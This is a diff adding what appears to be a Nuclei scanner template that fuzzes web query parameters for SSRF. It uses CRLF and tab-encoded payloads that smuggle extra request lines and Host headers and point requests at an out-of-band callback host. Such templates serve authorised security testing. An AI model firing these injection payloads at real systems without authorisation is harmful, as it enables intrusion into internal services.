@@ -1,0 +1,52 @@
+id: ssrf-bypass-via-crlf
+
+info:
+  name: SSRF bypass via CRLF
+  author: reewardius
+  reference: https://aditya-chauhan17.medium.com/html-injection-to-server-siderequest-forgery-ssrf-806ac48295ca
+  severity: high
+  tags: blind,fuzzing,ssrf,crlf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    
+    payloads:
+      ssrf:
+        - "http://{{interactsh-url}}/%0d%0aGET%20/ssrf-request%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0a"
+        - "http://{{Hostname}}@{{interactsh-url}}/%0d%0aGET%20/ssrf-request%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0a"
+        - "%0A%01%09Host:{{interactsh-url}}"
+        - "%09Host:{{interactsh-url}}"
+        - "%0D%0AHost:{{interactsh-url}}"
+        - "%0DHost:{{interactsh-url}}"
+        - "%0AHost:{{interactsh-url}}"
+        - "%09http://{{interactsh-url}}"
+        - "%0D%0Ahttp://{{interactsh-url}}"
+        - '%0Ahttp://{{interactsh-url}}'
+        - '%0Dhttp://{{interactsh-url}}'
+        - '%0Ahttp://{{interactsh-url}}'
+        - '%0Dhttp://{{interactsh-url}}'
+        - "%20http://{{Hostname}}@{{interactsh-url}}"
+        - "%0D%0Ahttp://{{Hostname}}@{{interactsh-url}}"
+        - "%0Ahttp://{{Hostname}}@{{interactsh-url}}"
+        - "%0Dhttp://{{Hostname}}@{{interactsh-url}}"
+        - "%0D%0Ahttp://{{Hostname}}\\@{{interactsh-url}}"
+        - "http://{{Hostname}}\\@{{interactsh-url}}"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{ssrf}}"
+          
+    stop-at-first-match: true
+    redirects: true
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
+        condition: or
